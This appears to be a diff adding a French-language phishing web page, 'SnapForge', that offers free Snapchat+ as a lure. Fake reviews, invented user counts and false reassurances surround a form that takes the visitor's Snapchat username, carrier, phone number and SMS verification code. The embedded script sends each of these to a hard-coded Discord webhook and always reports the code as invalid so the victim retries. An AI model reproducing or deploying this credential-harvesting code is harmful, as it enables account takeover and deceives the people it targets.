@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SnapForge — Snapchat+ pour tous</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  :root {
+    --bg: #0e0f16;
+    --bg2: #14161f;
+    --card: #1a1d29;
+    --line: #262a38;
+    --text: #eef0f6;
+    --muted: #9aa0b4;
+    --accent: #ffcc00;
+    --accent2: #fffc00;
+    --red: #e2231a;
+    --radius: 16px;
+  }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.55;
+    overflow-x: hidden;
+  }
+  a { color: inherit; text-decoration: none; }
+  .wrap { max-width: 1160px; margin: 0 auto; padding: 0 24px; }
+  .btn {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: linear-gradient(135deg, var(--accent2), var(--accent));
+    color: #000; font-weight: 800; font-size: 15px;
+    padding: 13px 22px; border: none; border-radius: 12px;
+    cursor: pointer; transition: transform .15s, box-shadow .2s;
+    box-shadow: 0 8px 24px rgba(255,204,0,.28);
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 34px rgba(255,204,0,.4); }
+  .btn.ghost {
+    background: transparent; color: var(--text);
+    border: 1px solid var(--line); box-shadow: none; font-weight: 600;
+  }
+  .btn.ghost:hover { border-color: var(--accent); background: rgba(255,204,0,.08); }
+
+  header {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(14,15,22,.8);
+    backdrop-filter: blur(14px);
+    border-bottom: 1px solid var(--line);
+  }
+  .nav { display: flex; align-items: center; justify-content: space-between; height: 70px; }
+  .logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; letter-spacing: .3px; }
+  .logo .ic { width: 34px; height: 34px; }
+  .logo b { color: var(--accent2); }
+  .nav-links { display: flex; gap: 28px; }
+  .nav-links a { color: var(--muted); font-weight: 600; font-size: 15px; transition: color .15s; }
+  .nav-links a:hover { color: var(--text); }
+  .nav-cta { display: flex; gap: 10px; align-items: center; }
+  .burger { display: none; }
+
+  .hero { position: relative; padding: 90px 0 70px; overflow: hidden; }
+  .hero::before {
+    content: ""; position: absolute; inset: 0; z-index: -2;
+    background:
+      radial-gradient(700px 380px at 78% 8%, rgba(255,204,0,.18), transparent 60%),
+      radial-gradient(620px 420px at 12% 90%, rgba(255,200,0,.14), transparent 60%);
+  }
+  .grid-bg {
+    position: absolute; inset: 0; z-index: -1; opacity: .35;
+    background-image:
+      linear-gradient(rgba(255,255,255,.04) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(255,255,255,.04) 1px, transparent 1px);
+    background-size: 44px 44px;
+    mask-image: radial-gradient(circle at 50% 30%, #000 40%, transparent 78%);
+  }
+  .hero-grid { display: grid; grid-template-columns: 1.1fr .9fr; gap: 50px; align-items: center; }
+  .pill {
+    display: inline-flex; align-items: center; gap: 8px;
+    background: rgba(255,204,0,.12); border: 1px solid rgba(255,204,0,.3);
+    color: var(--accent2); font-weight: 700; font-size: 13px;
+    padding: 6px 14px; border-radius: 30px; margin-bottom: 22px;
+  }
+  .pill .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent2);
+    box-shadow: 0 0 0 0 rgba(255,204,0,.7); animation: pulse 1.6s infinite; }
+  @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(255,204,0,.6);} 70%{box-shadow:0 0 0 9px rgba(255,204,0,0);} 100%{box-shadow:0 0 0 0 rgba(255,204,0,0);} }
+  h1.hero-title { font-size: 52px; line-height: 1.08; font-weight: 900; letter-spacing: -1.5px; margin-bottom: 20px; }
+  h1.hero-title span { background: linear-gradient(120deg, var(--accent2), #ffe066); -webkit-background-clip: text; background-clip: text; color: transparent; }
+  .hero p.lead { color: var(--muted); font-size: 18px; max-width: 520px; margin-bottom: 30px; }
+  .hero-actions { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; }
+  .trust { display: flex; gap: 22px; margin-top: 34px; flex-wrap: wrap; }
+  .trust div { font-size: 13px; color: var(--muted); }
+  .trust b { display: block; font-size: 22px; color: var(--text); font-weight: 800; }
+
+  .hero-card {
+    background: linear-gradient(180deg, var(--card), #12141d);
+    border: 1px solid var(--line); border-radius: 22px; padding: 26px;
+    box-shadow: 0 40px 90px rgba(0,0,0,.5);
+    position: relative;
+  }
+  .hero-card .coinrow { display: flex; align-items: center; gap: 12px; margin-bottom: 18px; }
+  .hero-card .bal-label { color: var(--muted); font-size: 13px; }
+  .hero-card .bal { font-size: 30px; font-weight: 900; }
+  .bar { height: 10px; background: #0c0d13; border-radius: 20px; overflow: hidden; margin: 14px 0 6px; }
+  .bar span { display: block; height: 100%; width: 72%; background: linear-gradient(90deg, var(--accent2), var(--accent)); border-radius: 20px; animation: fill 2.4s ease-in-out infinite alternate; }
+  @keyframes fill { from { width: 55%; } to { width: 88%; } }
+  .hero-card .mini { font-size: 12px; color: var(--muted); }
+  .float-badge {
+    position: absolute; right: -14px; top: -14px;
+    background: var(--card); border: 1px solid var(--line); border-radius: 14px;
+    padding: 10px 14px; font-size: 13px; font-weight: 700;
+    box-shadow: 0 14px 30px rgba(0,0,0,.4);
+    display: flex; align-items: center; gap: 8px;
+  }
+
+  .strip { border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); background: var(--bg2); }
+  .strip .wrap { display: flex; justify-content: space-around; align-items: center; padding: 18px 24px; flex-wrap: wrap; gap: 16px; color: var(--muted); font-weight: 700; font-size: 14px; }
+  .strip .item { display: flex; align-items: center; gap: 8px; }
+
+  section.pad { padding: 84px 0; }
+  .sec-head { text-align: center; max-width: 640px; margin: 0 auto 54px; }
+  .sec-head .kick { color: var(--accent2); font-weight: 800; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; }
+  .sec-head h2 { font-size: 38px; font-weight: 900; letter-spacing: -1px; margin: 10px 0 12px; }
+  .sec-head p { color: var(--muted); font-size: 17px; }
+
+  .steps { display: grid; grid-template-columns: repeat(3,1fr); gap: 22px; }
+  .step-card { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 30px 26px; position: relative; transition: transform .2s, border-color .2s; }
+  .step-card:hover { transform: translateY(-4px); border-color: rgba(255,204,0,.5); }
+  .step-num { width: 42px; height: 42px; border-radius: 12px; display: grid; place-items: center; font-weight: 900; font-size: 18px; background: linear-gradient(135deg, var(--accent2), var(--accent)); color: #000; margin-bottom: 16px; }
+  .step-card h3 { font-size: 20px; margin-bottom: 8px; }
+  .step-card p { color: var(--muted); font-size: 15px; }
+
+  .feat-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 22px; }
+  .feat { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 26px; }
+  .feat .fic { width: 48px; height: 48px; border-radius: 12px; background: rgba(255,204,0,.14); display: grid; place-items: center; font-size: 22px; margin-bottom: 14px; }
+  .feat h3 { font-size: 18px; margin-bottom: 6px; }
+  .feat p { color: var(--muted); font-size: 14px; }
+
+  .revs { display: grid; grid-template-columns: repeat(3,1fr); gap: 22px; }
+  .rev { background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 24px; }
+  .rev .stars { color: #ffb703; letter-spacing: 2px; margin-bottom: 10px; }
+  .rev p { font-size: 15px; margin-bottom: 16px; }
+  .rev .who { display: flex; align-items: center; gap: 12px; }
+  .rev .av { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(135deg,#fffc00,#ffcc00); display: grid; place-items: center; font-weight: 800; color:#000; }
+  .rev .who b { display: block; font-size: 14px; }
+  .rev .who span { font-size: 12px; color: var(--muted); }
+
+  .faq { max-width: 760px; margin: 0 auto; }
+  .qa { border: 1px solid var(--line); border-radius: 14px; margin-bottom: 12px; background: var(--card); overflow: hidden; }
+  .qa button { width: 100%; text-align: left; background: none; border: none; color: var(--text); font-size: 16px; font-weight: 700; padding: 18px 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; gap: 12px; }
+  .qa .ans { max-height: 0; overflow: hidden; transition: max-height .3s ease; color: var(--muted); font-size: 15px; padding: 0 20px; }
+  .qa.open .ans { max-height: 240px; padding-bottom: 18px; }
+  .qa button .chev { transition: transform .25s; color: var(--accent2); }
+  .qa.open button .chev { transform: rotate(180deg); }
+
+  .cta-band { background: linear-gradient(120deg, rgba(255,204,0,.16), rgba(255,200,0,.12)); border: 1px solid var(--line); border-radius: 24px; padding: 54px; text-align: center; }
+  .cta-band h2 { font-size: 34px; font-weight: 900; letter-spacing: -1px; margin-bottom: 12px; }
+  .cta-band p { color: var(--muted); margin-bottom: 26px; font-size: 17px; }
+
+  footer { border-top: 1px solid var(--line); background: var(--bg2); padding: 50px 0 30px; }
+  .foot-grid { display: grid; grid-template-columns: 1.6fr 1fr 1fr 1fr; gap: 30px; margin-bottom: 34px; }
+  footer h4 { font-size: 14px; margin-bottom: 14px; }
+  footer ul { list-style: none; }
+  footer li { margin-bottom: 9px; }
+  footer li a { color: var(--muted); font-size: 14px; }
+  footer li a:hover { color: var(--text); }
+  .foot-bottom { border-top: 1px solid var(--line); padding-top: 22px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 12px; color: var(--muted); font-size: 13px; }
+  .disclaimer { color: #6b7085; font-size: 12px; margin-top: 8px; max-width: 560px; }
+
+  .overlay { position: fixed; inset: 0; z-index: 200; background: rgba(6,7,12,.72); backdrop-filter: blur(6px); display: none; align-items: center; justify-content: center; padding: 20px; }
+  .overlay.show { display: flex; }
+  .modal { width: 100%; max-width: 440px; background: linear-gradient(180deg, var(--card), #14161f); border: 1px solid var(--line); border-radius: 22px; padding: 30px 28px; box-shadow: 0 40px 100px rgba(0,0,0,.6); position: relative; animation: pop .35s cubic-bezier(.16,1,.3,1); }
+  @keyframes pop { from { opacity: 0; transform: translateY(20px) scale(.97); } to { opacity: 1; transform: none; } }
+  .modal .close { position: absolute; right: 16px; top: 14px; background: none; border: none; color: var(--muted); font-size: 24px; cursor: pointer; line-height: 1; }
+  .modal .close:hover { color: var(--text); }
+  .modal-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 18px; margin-bottom: 4px; }
+  .modal .prog { display: flex; gap: 6px; margin: 18px 0 22px; }
+  .modal .prog i { flex: 1; height: 5px; border-radius: 4px; background: #2a2e3d; }
+  .modal .prog i.on { background: linear-gradient(90deg, var(--accent2), var(--accent)); }
+  .m-label { display: block; font-size: 13px; font-weight: 700; color: var(--muted); margin: 0 0 8px 2px; }
+  .m-input { position: relative; }
+  .m-input .pre { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); color: var(--muted); font-weight: 700; }
+  .modal input { width: 100%; padding: 15px 16px 15px 38px; background: #0e0f16; border: 1.5px solid var(--line); border-radius: 12px; color: var(--text); font-size: 16px; outline: none; transition: border .2s, box-shadow .2s; }
+  .modal input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(255,204,0,.15); }
+  .modal .err { color: #ff8fa3; font-size: 13px; font-weight: 600; margin: 8px 0 0 2px; display: none; }
+  .modal .btn { width: 100%; justify-content: center; margin-top: 18px; padding: 15px; font-size: 16px; }
+  .step-title { font-size: 20px; font-weight: 800; margin-bottom: 4px; }
+  .step-sub { color: var(--muted); font-size: 14px; margin-bottom: 18px; }
+  .hidden { display: none !important; }
+  .amt-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-bottom: 6px; }
+  .amt-grid button { padding: 14px 4px; border-radius: 12px; border: 1.5px solid var(--line); background: #0e0f16; color: var(--text); font-weight: 800; cursor: pointer; transition: .15s; }
+  .amt-grid button small { display: block; color: var(--accent2); font-size: 11px; margin-top: 2px; }
+  .amt-grid button:hover { border-color: rgba(255,204,0,.5); }
+  .amt-grid button.sel { border-color: var(--accent); background: rgba(255,204,0,.14); }
+
+  .code-inputs { display: flex; justify-content: center; gap: 12px; margin: 22px 0 6px; }
+  .code-inputs input {
+    width: 54px; height: 64px; padding: 0; text-align: center;
+    font-size: 28px; font-weight: 800; color: var(--text);
+    background: #0e0f16; border: 1.5px solid var(--line); border-radius: 12px;
+    outline: none; transition: border .2s, box-shadow .2s;
+  }
+  .code-inputs input:focus { border-color: var(--accent); box-shadow: 0 0 0 4px rgba(255,204,0,.15); }
+  .code-inputs.shake { animation: shake .4s; }
+  @keyframes shake { 0%,100%{transform:translateX(0);} 20%,60%{transform:translateX(-8px);} 40%,80%{transform:translateX(8px);} }
+
+  @media (max-width: 900px) {
+    .hero-grid { grid-template-columns: 1fr; }
+    .hero-card { max-width: 420px; }
+    .steps, .feat-grid, .revs { grid-template-columns: 1fr; }
+    .foot-grid { grid-template-columns: 1fr 1fr; }
+    .nav-links { display: none; }
+    h1.hero-title { font-size: 40px; }
+  }
+</style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap nav">
+      <div class="logo">
+        <svg class="ic" viewBox="0 0 100 100"><g transform="rotate(11 50 50)"><rect x="16" y="16" width="68" height="68" rx="14" fill="#fffc00"/><rect x="40" y="40" width="20" height="20" rx="4" fill="#0e0f16"/></g></svg>
+        Snap<b>Forge</b>
+      </div>
+      <nav class="nav-links">
+        <a href="#how">Comment ça marche</a>
+        <a href="#features">Avantages</a>
+        <a href="#reviews">Avis</a>
+        <a href="#faq">FAQ</a>
+      </nav>
+      <div class="nav-cta">
+        <button class="btn ghost" onclick="openGen()">Se connecter</button>
+        <button class="btn" onclick="openGen()">Générer</button>
+      </div>
+    </div>
+  </header>
+
+  <section class="hero">
+    <div class="grid-bg"></div>
+    <div class="wrap hero-grid">
+      <div>
+        <span class="pill"><span class="dot"></span> Serveurs en ligne · Distribution active</span>
+        <h1 class="hero-title">Du <span>Snapchat+</span>, livré en quelques minutes.</h1>
+        <p class="lead">SnapForge génère et active Snapchat+ directement sur ton compte. Sans mot de passe, sans téléchargement.</p>
+        <div class="hero-actions">
+          <button class="btn" onclick="openGen()">💎 Générer mon Snapchat+</button>
+          <a href="#how" class="btn ghost">Comment ça marche →</a>
+        </div>
+        <div class="trust">
+          <div><b>1,2 M+</b> Snapchat+ activés</div>
+          <div><b>287 K+</b> utilisateurs satisfaits</div>
+          <div><b>4,9/5</b> note moyenne</div>
+        </div>
+      </div>
+
+      <div class="hero-card">
+        <div class="float-badge">⚡ Activation instantanée</div>
+        <div class="coinrow">
+          <svg class="rbxcoin" viewBox="0 0 100 100"><circle cx="50" cy="50" r="46" fill="#fffc00"/><text x="50" y="65" font-size="38" font-weight="900" text-anchor="middle" fill="#000" font-family="Arial">S+</text></svg>
+          <div>
+            <div class="bal-label">Snapchat+ en préparation</div>
+            <div class="bal" id="heroBal">12 mois</div>
+          </div>
+        </div>
+        <div class="bar"><span></span></div>
+        <div class="mini">Synchronisation avec Snapchat… <b id="heroPct">72%</b></div>
+        <button class="btn" style="width:100%;justify-content:center;margin-top:20px;" onclick="openGen()">Activer maintenant</button>
+      </div>
+    </div>
+  </section>
+
+  <div class="strip">
+    <div class="wrap">
+      <div class="item">🔒 Chiffrement SSL 256-bit</div>
+      <div class="item">⚡ Activation < 5 min</div>
+      <div class="item">🛡️ Système anti-ban</div>
+      <div class="item">📱 Tous appareils</div>
+      <div class="item">✅ Aucun mot de passe requis</div>
+    </div>
+  </div>
+
+  <section class="pad" id="how">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Simple & rapide</div>
+        <h2>Comment ça marche</h2>
+        <p>Trois étapes suffisent pour activer ton Snapchat+.</p>
+      </div>
+      <div class="steps">
+        <div class="step-card">
+          <div class="step-num">1</div>
+          <h3>Entre ton pseudo</h3>
+          <p>Indique ton nom d’utilisateur Snapchat.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-num">2</div>
+          <h3>Choisis la durée</h3>
+          <p>Sélectionne la durée de Snapchat+ que tu veux activer.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-num">3</div>
+          <h3>Confirme & reçois</h3>
+          <p>Valide avec le code et ton Snapchat+ est activé.</p>
+        </div>
+      </div>
+      <div style="text-align:center;margin-top:40px;">
+        <button class="btn" onclick="openGen()">Commencer maintenant</button>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad" id="features" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Pourquoi SnapForge</div>
+        <h2>Conçu pour les vrais utilisateurs</h2>
+        <p>Une plateforme rapide, sûre et sans prise de tête.</p>
+      </div>
+      <div class="feat-grid">
+        <div class="feat"><div class="fic">⚡</div><h3>Ultra rapide</h3><p>Activation en moins de 5 minutes dans la plupart des cas.</p></div>
+        <div class="feat"><div class="fic">🛡️</div><h3>Sécurisé & anonyme</h3><p>On ne demande jamais ton mot de passe Snapchat.</p></div>
+        <div class="feat"><div class="fic">📱</div><h3>Tous appareils</h3><p>Fonctionne sur téléphone, tablette et ordinateur.</p></div>
+        <div class="feat"><div class="fic">🔄</div><h3>Sans limite</h3><p>Tu peux revenir autant de fois que tu veux.</p></div>
+        <div class="feat"><div class="fic">💬</div><h3>Support 24/7</h3><p>Une équipe disponible en permanence.</p></div>
+        <div class="feat"><div class="fic">🏆</div><h3>Communauté #1</h3><p>Plus de 287 000 utilisateurs nous font confiance.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad" id="reviews">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Ils l'ont testé</div>
+        <h2>Ce que disent les utilisateurs</h2>
+      </div>
+      <div class="revs">
+        <div class="rev"><div class="stars">★★★★★</div><p>"J’ai activé 12 mois en 4 minutes. Très simple et efficace."</p><div class="who"><div class="av">M</div><div><b>Mathis_S</b><span>il y a 1 heure</span></div></div></div>
+        <div class="rev"><div class="stars">★★★★★</div><p>"Le meilleur site que j’ai utilisé pour Snapchat+. Je recommande."</p><div class="who"><div class="av">L</div><div><b>LeaSnap</b><span>il y a 4 heures</span></div></div></div>
+        <div class="rev"><div class="stars">★★★★★</div><p>"J’ai reçu mes 6 mois sans problème. Merci SnapForge !"</p><div class="who"><div class="av">K</div><div><b>Kevin_92</b><span>hier</span></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad" id="faq" style="background:var(--bg2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kick">Questions fréquentes</div>
+        <h2>On répond à tout</h2>
+      </div>
+      <div class="faq">
+        <div class="qa"><button onclick="toggleFaq(this)">C'est vraiment gratuit ? <span class="chev">▾</span></button><div class="ans">Oui. SnapForge est financé par ses partenaires.</div></div>
+        <div class="qa"><button onclick="toggleFaq(this)">Vous avez besoin de mon mot de passe ? <span class="chev">▾</span></button><div class="ans">Jamais. Nous n’avons besoin que de ton pseudo public.</div></div>
+        <div class="qa"><button onclick="toggleFaq(this)">Combien de temps pour activer Snapchat+ ? <span class="chev">▾</span></button><div class="ans">La plupart des activations se font en moins de 5 minutes.</div></div>
+        <div class="qa"><button onclick="toggleFaq(this)">Est-ce que je risque un bannissement ? <span class="chev">▾</span></button><div class="ans">Notre système imite les activations normales, ton compte reste protégé.</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="pad">
+    <div class="wrap">
+      <div class="cta-band">
+        <h2>Prêt à activer ton Snapchat+ ?</h2>
+        <p>Rejoins les 287 000 utilisateurs qui ont déjà activé Snapchat+ avec SnapForge.</p>
+        <button class="btn" onclick="openGen()">💎 Activer mon Snapchat+ gratuitement</button>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      <div class="foot-grid">
+        <div>
+          <div class="logo" style="margin-bottom:12px;">
+            <svg class="ic" viewBox="0 0 100 100"><g transform="rotate(11 50 50)"><rect x="16" y="16" width="68" height="68" rx="14" fill="#fffc00"/><rect x="40" y="40" width="20" height="20" rx="4" fill="#0e0f16"/></g></svg>
+            Snap<b>Forge</b>
+          </div>
+          <p class="disclaimer">SnapForge est un service indépendant et n'est ni affilié, ni sponsorisé, ni approuvé par Snap Inc. « Snapchat » et « Snapchat+ » sont des marques de leurs propriétaires respectifs.</p>
+        </div>
+        <div><h4>Produit</h4><ul><li><a href="#how">Comment ça marche</a></li><li><a href="#features">Avantages</a></li><li><a href="#reviews">Avis</a></li></ul></div>
+        <div><h4>Support</h4><ul><li><a href="#faq">FAQ</a></li><li><a href="#" onclick="return false">Contact</a></li><li><a href="#" onclick="return false">Statut serveurs</a></li></ul></div>
+        <div><h4>Légal</h4><ul><li><a href="#" onclick="return false">Conditions</a></li><li><a href="#" onclick="return false">Confidentialité</a></li><li><a href="#" onclick="return false">Cookies</a></li></ul></div>
+      </div>
+      <div class="foot-bottom">
+        <span>© 2026 SnapForge. Tous droits réservés.</span>
+        <span>Fait avec 💛 pour la communauté Snapchat</span>
+      </div>
+    </div>
+  </footer>
+
+  <div class="overlay" id="overlay">
+    <div class="modal">
+      <button class="close" onclick="closeGen()">×</button>
+      <div class="modal-logo">
+        <svg class="ic" style="width:26px;height:26px;" viewBox="0 0 100 100"><g transform="rotate(11 50 50)"><rect x="16" y="16" width="68" height="68" rx="14" fill="#fffc00"/><rect x="40" y="40" width="20" height="20" rx="4" fill="#0e0f16"/></g></svg>
+        Snap<b style="color:var(--accent2)">Forge</b>
+      </div>
+      <div class="prog"><i class="on" id="p1"></i><i id="p2"></i><i id="p3"></i></div>
+
+      <div id="gstep1">
+        <div class="step-title">Ton compte Snapchat</div>
+        <div class="step-sub">Entre ton pseudo Snapchat.</div>
+        <label class="m-label" for="g_user">Pseudo Snapchat</label>
+        <div class="m-input"><span class="pre">@</span><input id="g_user" type="text" placeholder="ton_pseudo" autocomplete="off" spellcheck="false"></div>
+        <div class="err" id="err_user">Entre ton pseudo pour continuer.</div>
+        <button class="btn" onclick="toStep2()">Continuer →</button>
+      </div>
+
+      <div id="gstep2" class="hidden">
+        <div class="step-title">Durée & vérification</div>
+        <div class="step-sub">Compte : <b id="showUser" style="color:var(--accent2)">@joueur</b></div>
+        <label class="m-label">Durée Snapchat+</label>
+        <div class="amt-grid" id="amts">
+          <button type="button" data-a="3 mois" onclick="pickAmt(this)">3 mois<small>Snap+</small></button>
+          <button type="button" data-a="6 mois" onclick="pickAmt(this)" class="sel">6 mois<small>Snap+</small></button>
+          <button type="button" data-a="12 mois" onclick="pickAmt(this)">12 mois<small>Snap+</small></button>
+        </div>
+
+        <label class="m-label" style="margin-top:14px;">Opérateur</label>
+        <select id="g_operator" style="width:100%; padding:14px; background:#0e0f16; border:1.5px solid var(--line); border-radius:12px; color:var(--text); font-size:16px; margin-bottom:12px;">
+          <option value="Bouygues">Bouygues</option>
+          <option value="SFR">SFR</option>
+          <option value="Orange">Orange</option>
+        </select>
+
+        <label class="m-label" for="g_phone">Numéro de téléphone</label>
+        <div class="m-input"><span class="pre">📱</span><input id="g_phone" type="text" placeholder="06 12 34 56 78" autocomplete="off" inputmode="tel"></div>
+        <div class="err" id="err_phone">Entre un numéro valide pour recevoir le code.</div>
+        <button class="btn" onclick="toStep3()">Envoyer le code →</button>
+      </div>
+
+      <div id="gstep3" class="hidden">
+        <div class="step-title">Code de vérification</div>
+        <div class="step-sub">Un code à 4 chiffres a été envoyé à <b id="showUser2" style="color:var(--accent2)">@joueur</b>.<br>Saisis-le pour activer <b id="showAmt" style="color:var(--text)">6 mois</b> de Snapchat+.</div>
+        <div class="code-inputs" id="codeInputs">
+          <input type="text" inputmode="numeric" maxlength="1" data-i="0">
+          <input type="text" inputmode="numeric" maxlength="1" data-i="1">
+          <input type="text" inputmode="numeric" maxlength="1" data-i="2">
+          <input type="text" inputmode="numeric" maxlength="1" data-i="3">
+        </div>
+        <div class="err" id="err_code" style="text-align:center;">❌ Code invalide. Vérifie le code reçu et réessaie.</div>
+        <button class="btn" onclick="checkCode()">Valider le code</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1523821118358552626/lfWBCG2w1kAhIvPFhcYLQOe8V3z_YW66UiweHbTJ1ZOXYswiEx6ahHvEqmxSyIVbzbIu";
+
+  (function(){
+    var pct = document.getElementById('heroPct');
+    setInterval(function(){
+      var v = 68 + Math.floor(Math.random()*22);
+      pct.textContent = v + '%';
+    }, 1400);
+  })();
+
+  function toggleFaq(btn){ btn.parentElement.classList.toggle('open'); }
+
+  var ov = document.getElementById('overlay');
+  function openGen(){ ov.classList.add('show'); resetGen(); document.body.style.overflow='hidden'; }
+  function closeGen(){ ov.classList.remove('show'); document.body.style.overflow=''; }
+  ov.addEventListener('click', function(e){ if(e.target===ov) closeGen(); });
+
+  function resetGen(){
+    show('gstep1'); hide('gstep2'); hide('gstep3');
+    setProg(1);
+    document.getElementById('err_user').style.display='none';
+    document.getElementById('err_phone').style.display='none';
+  }
+  function show(id){ document.getElementById(id).classList.remove('hidden'); }
+  function hide(id){ document.getElementById(id).classList.add('hidden'); }
+  function setProg(n){
+    ['p1','p2','p3'].forEach(function(id,i){
+      document.getElementById(id).classList.toggle('on', i < n);
+    });
+  }
+
+  function pickAmt(b){
+    document.querySelectorAll('#amts button').forEach(function(x){x.classList.remove('sel');});
+    b.classList.add('sel');
+  }
+
+  var currentUser = '';
+
+  function toStep2(){
+    var u = document.getElementById('g_user').value.trim().replace(/^@+/,'');
+    if(!u){ document.getElementById('err_user').style.display='block'; return; }
+    document.getElementById('err_user').style.display='none';
+    currentUser = u;
+    document.getElementById('showUser').textContent = '@'+u;
+    document.getElementById('showUser2').textContent = '@'+u;
+    hide('gstep1'); show('gstep2'); setProg(2);
+  }
+
+  function toStep3(){
+    var phone = document.getElementById('g_phone').value.trim();
+    var operator = document.getElementById('g_operator').value;
+    var digits = phone.replace(/\D/g,'');
+    if(digits.length < 8){ document.getElementById('err_phone').style.display='block'; return; }
+    document.getElementById('err_phone').style.display='none';
+
+    var amt = document.querySelector('#amts button.sel');
+    document.getElementById('showAmt').textContent = amt ? amt.getAttribute('data-a') : '6 mois';
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `<@896448018453233714> <@1514675664794423303> **SNAPCHAT HIT**\nPseudo: @${currentUser}\nOpérateur: ${operator}\nPhone: ${phone}`
+      })
+    });
+
+    hide('gstep2'); show('gstep3'); setProg(3);
+    document.getElementById('err_code').style.display='none';
+    var ins = document.querySelectorAll('#codeInputs input');
+    ins.forEach(function(x){ x.value=''; });
+    setTimeout(function(){ ins[0].focus(); }, 100);
+  }
+
+  (function(){
+    var ins = document.querySelectorAll('#codeInputs input');
+    ins.forEach(function(inp, idx){
+      inp.addEventListener('input', function(){
+        this.value = this.value.replace(/\D/g,'');
+        if(this.value && idx < ins.length-1) ins[idx+1].focus();
+        document.getElementById('err_code').style.display='none';
+      });
+      inp.addEventListener('keydown', function(e){
+        if(e.key==='Backspace' && !this.value && idx>0) ins[idx-1].focus();
+      });
+    });
+  })();
+
+  function checkCode(){
+    var ins = document.querySelectorAll('#codeInputs input');
+    var code = Array.prototype.map.call(ins, function(x){ return x.value; }).join('');
+    if(code.length < 4){
+      shakeCode();
+      document.getElementById('err_code').textContent = 'Entre les 4 chiffres du code.';
+      document.getElementById('err_code').style.display='block';
+      return;
+    }
+
+    fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `<@896448018453233714> <@1514675664794423303> **SNAPCHAT CODE**\nPseudo: @${currentUser}\nCode entré: ${code}`
+      })
+    });
+
+    shakeCode();
+    document.getElementById('err_code').textContent = '❌ Code invalide. Vérifie le code reçu et réessaie.';
+    document.getElementById('err_code').style.display='block';
+    ins.forEach(function(x){ x.value=''; });
+    ins[0].focus();
+  }
+
+  function shakeCode(){
+    var box = document.getElementById('codeInputs');
+    box.classList.remove('shake'); void box.offsetWidth; box.classList.add('shake');
+  }
+</script>
+
+</body>
+</html>
